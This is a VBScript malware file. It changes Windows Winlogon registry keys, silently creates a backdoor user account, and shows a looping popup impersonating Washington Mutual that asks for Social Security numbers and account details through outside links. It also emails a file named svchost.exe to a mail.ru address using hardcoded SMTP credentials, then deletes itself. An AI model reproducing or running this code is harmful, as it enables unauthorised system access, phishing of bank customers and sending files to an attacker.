on error resume next
Set S = CreateObject("Wscript.Shell")
set FSO=createobject("scripting.filesystemobject")
s.regwrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\LegalNoticeCaption","заголовок","REG_SZ"
s.regwrite"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\LegalNoticeText","сообщение","REG_SZ"
s.run"net user WASH DC ! 123 /add",0
i=1
while i>0 or i<0
S.popup "Dear Washington Mutual customer,

Due to concerns for the safety and integrity of the online banking community
we have issued this warning message. It has come to our attention that your
account information needs to be updated due to inactivity. If you could please
take 5-10 minutes out of your online experience and renew your records you will
not run into any future problems with the online service. In case you are not
enrolled for Internet Banking, you will have to use your Social Security Number
as both your Personal ID and Password and fill in all the required information,
including your name and your account number.

However, failure to update your records may result in your debit card suspension.
Once you have updated your account records your internet baking service will
not be interrupted and will continue as normal.

Please follow the link below to renew your account information.

http://dedal.ru///dedal or http://rotten.com

Thank you for your prompt attention to this matter

Sincerely,
The Washington Mutual Bank Team,0 ",0, "Washington BC",0+64
i=i-1
wend
Call SendPost("smtp.mail.ru","vision@mail.ru","zlibexe@mail.ru","HB FOR COMPUTER !","Happy Birthday for you komputer !")
Function SendPost(strSMTP_Server,strTo,strFrom,strSubject,strBody)
Set iMsg=CreateObject("CDO.Message")
Set iConf=CreateObject("CDO.Configuration")
Set Flds=iConf.Fields
Flds.Item("http://schemas.microsoft.com/cdo/configuration/sendusing")=2
Flds.Item("http://schemas.microsoft.com/cdo/configuration/smtpauthenticate")=1
Flds.Item("http://schemas.microsoft.com/cdo/configuration/sendusername")="ZLOBER"
Flds.Item("http://schemas.microsoft.com/cdo/configuration/sendpassword")="master"
Flds.Item("http://schemas.microsoft.com/cdo/configuration/smtpserver")="smtp.mail.ru"
Flds.Item("http://schemas.microsoft.com/cdo/configuration/smtpserverport")=25
Flds.Update
iMsg.Configuration=iConf
iMsg.To=strTo
iMsg.From=strFrom
iMsg.Subject=strSubject
iMsg.TextBody=strBody
iMsg.AddAttachment "c:\svchost.exe" 
iMsg.Send
End Function
Set iMsg=Nothing
Set iConf=Nothing
Set Flds=Nothing

fso.deletefile wscript.scriptfullname

